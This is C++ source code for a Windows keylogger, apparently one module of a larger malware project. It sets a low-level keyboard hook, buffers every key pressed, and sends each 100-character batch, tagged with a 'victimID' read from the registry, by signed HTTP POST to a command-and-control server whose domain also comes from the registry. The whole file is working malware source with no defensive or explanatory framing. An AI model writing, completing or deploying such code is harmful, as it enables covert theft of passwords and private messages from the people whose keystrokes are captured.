#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <string>

const int MAX_BUFFER_SIZE = 100;
std::string buffer;
IPC ipc = IPC();
wstring SERVER_BASE_URL_FINAL = ipc.readDomainFromRegistry();
wstring victimID = ipc.readFromRegistry();
string victimStr(victimID.begin(), victimID.end());

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    output->append(static_cast<char*>(contents), total_size);
    return total_size;
}

string sendResult(string victimID, string result) {
    httpRequest http = httpRequest();
    string XappTimestamp = http.createTimeStamp();
    string XAppSignature = http.createSignature("/KeyResult");
    CURL* curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    wstring url = SERVER_BASE_URL_FINAL + L"/Action/KeyResult";
    string urlStr(url.begin(), url.end());

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, urlStr.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
        headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        string post_data = "{\"id\":\"" + victimID + "\", \"result\":\"" + result + "\"}";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());

        string response_data;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        long http_response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
        std::cout << "HTTP Response Code: " << http_response_code << std::endl;

        curl_global_cleanup();
        curl_easy_cleanup(curl);

        return response_data;
    }
}

// hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static int keycount = 0;
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        buffer += static_cast<char>(vkCode);
        keycount++;

        if (buffer.size() >= MAX_BUFFER_SIZE) {
            sendResult(victimStr, buffer);
            buffer.clear();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

class KeyloggerClass {
    bool shouldExit = false;

public:
    static DWORD WINAPI KeyCaptureThread(LPVOID lpParam) {
        bool shouldExit = false;
        HHOOK hook = NULL;
        // set hook
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        if (hook == NULL) {
            printf("Failed to set hook\n");
            return 1;
        }

        MSG msg;
        while (!shouldExit) {
            GetMessage(&msg, NULL, 0, 0);
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // delete hook
        UnhookWindowsHookEx(hook);

        return 0;
    }

    int init() {
        HANDLE threadHandle = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(KeyloggerClass::KeyCaptureThread), NULL, 0, NULL);
        if (threadHandle == NULL) {
            printf("Failed to create key capture thread\n");
            return 1;
        }
        shouldExit = true;
        CloseHandle(threadHandle);
        return 0;
    }
};
